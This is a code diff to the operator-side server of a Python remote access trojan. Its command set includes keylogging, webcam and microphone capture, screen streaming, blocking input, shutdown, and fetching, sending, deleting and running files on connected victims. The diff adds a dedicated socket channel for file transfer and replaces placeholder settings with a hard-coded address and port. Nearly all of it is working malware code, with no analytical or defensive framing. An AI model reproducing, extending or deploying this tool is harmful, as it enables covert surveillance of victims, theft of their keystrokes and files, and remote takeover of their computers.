@@ -17,9 +17,9 @@ import pyaudio
 import json
 
 
-ip = "%SERVER_IP%"
+ip = "192.168.1.16"
 print(ip)
-port = int("%SERVER_PORT%")
+port = int("8080")
 
 initliaze = lambda obj , x_coord , y_coord: obj.place(x=x_coord , y=y_coord)
 
@@ -48,7 +48,7 @@ except:
 
 #################################################################
 
-def recieve_file(client , arg , autorun):
+def recieve_file(client , arg , autorun , transfer_conn):
         global target
         file_data = b""
         client.sendall(pickle.dumps(create_header(prefix , arg , None , None)))
@@ -58,7 +58,7 @@ def recieve_file(client , arg , autorun):
         else:
             for n in range(pickle.loads(iters)):
                 client.sendall(b"ok")
-                pezzo = client.recv(1000000)
+                pezzo = transfer_conn.recv(1000000)
                 file_data = file_data + pezzo
             os.chdir(target)
             nome = arg.split("\\")[-1]
@@ -70,7 +70,7 @@ def recieve_file(client , arg , autorun):
             if autorun:
                 os.startfile(os.path.join(target , nome))
 
-def sendfile(argument , auto_open , client):
+def sendfile(argument , auto_open , client , transfer_conn):
     if auto_open == False:
         mode = input("Would you like to open it at the end of download?: ")
     elif auto_open == True:
@@ -91,7 +91,7 @@ def sendfile(argument , auto_open , client):
             chunknumber = 0
             for n in range(iters):
                 status = client.recv(1024)
-                client.sendall(chunks[chunknumber])
+                transfer_conn.sendall(chunks[chunknumber])
                 chunknumber += 1
             print(Fore.GREEN + "done!")
         except PermissionError:
@@ -316,7 +316,7 @@ def error_to_info(Error):
 one_a_commands = ["$dir" , "$del" , "$shutdown" , "$restart" , "$get" , "$run" , "$changetarget" , "$send" , "$change_client" , "$change_directory"]
 zero_a_commands = ["$stopmic" , "$startmic" , "$getip" , "$test" , "$netstat" , "$blockmouse" , "$unblockmouse" , "$startkeylogger" , "$stopkeylogger" , "$blockkeyboard" , "$unblockkeyboard" , "$startstream" , "$stopstream" , "$soundboard" , "$startcamera" , "$clients" , "$stopcamera"]
 
-ratpath = r"C:\Users\Mio_PC\Desktop\Nuova cartella (7)"
+ratpath = os.path.dirname(sys.argv[0])
 try:
     os.chdir(ratpath)
     os.makedirs(name = "Outputs")
@@ -345,6 +345,7 @@ def initialize_clients(thing):
         camera_mutex = None
         client_mutex = None
         mic_mutex = None
+        transfer_mutex = None
         try:
 
             thing.listen()
@@ -363,6 +364,7 @@ def initialize_clients(thing):
                 hb_mutex = pickle.loads(hb_type.recv(100))
                 if hb_mutex != "$hb":
                     hb_type.close()
+            print("hearbeat established")
                 
 
             while stream_mutex != "$stream":
@@ -370,6 +372,7 @@ def initialize_clients(thing):
                 stream_mutex = pickle.loads(stream_type.recv(100))
                 if stream_mutex != "$stream":
                     stream_type.close()
+            print("stream established")
 
             
             while camera_mutex != "$camera":
@@ -377,12 +380,21 @@ def initialize_clients(thing):
                 camera_mutex = pickle.loads(camera_type.recv(100))
                 if camera_mutex != "$camera":
                     camera_type.close()
+            print("camera established")
 
             while mic_mutex != "$mic_audio":
                 mic_type , mic_addr = thing.accept()
                 mic_mutex = pickle.loads(mic_type.recv(100))
                 if mic_mutex != "$mic_audio":
                     mic_type.close()
+            print("microphone established")
+
+            while transfer_mutex != "$transfer":
+                transfer_type, transfer_addr = thing.accept()
+                transfer_mutex = pickle.loads(transfer_type.recv(100))
+                if transfer_mutex != "$transfer":
+                    transfer_type.close()
+            print("transfer established")
 
             print(Fore.GREEN + f"Got new Connection! {client_addr}" + Fore.RESET)
             client_assembly = {
@@ -394,7 +406,8 @@ def initialize_clients(thing):
                 "heartbeat": hb_type,
                 "stream": stream_type,
                 "camera": camera_type,
-                "mic_audio": mic_type
+                "mic_audio": mic_type,
+                "transfer": transfer_type
                 
             }
             current_connection = client_assembly["client"]
@@ -522,10 +535,10 @@ while True:
                                     
 
                             if prefix == "$get":
-                                recieve_file(connessione , arg , False)
+                                recieve_file(connessione , arg , False , current_array["transfer"])
                                 
                             if prefix == "$send":
-                                sendfile(arg , False , connessione)
+                                sendfile(arg , False , connessione , current_array["transfer"])
 
                             if prefix == "$change_client":
                                 connessione = total_connections[int(arg) - 1]["client"]
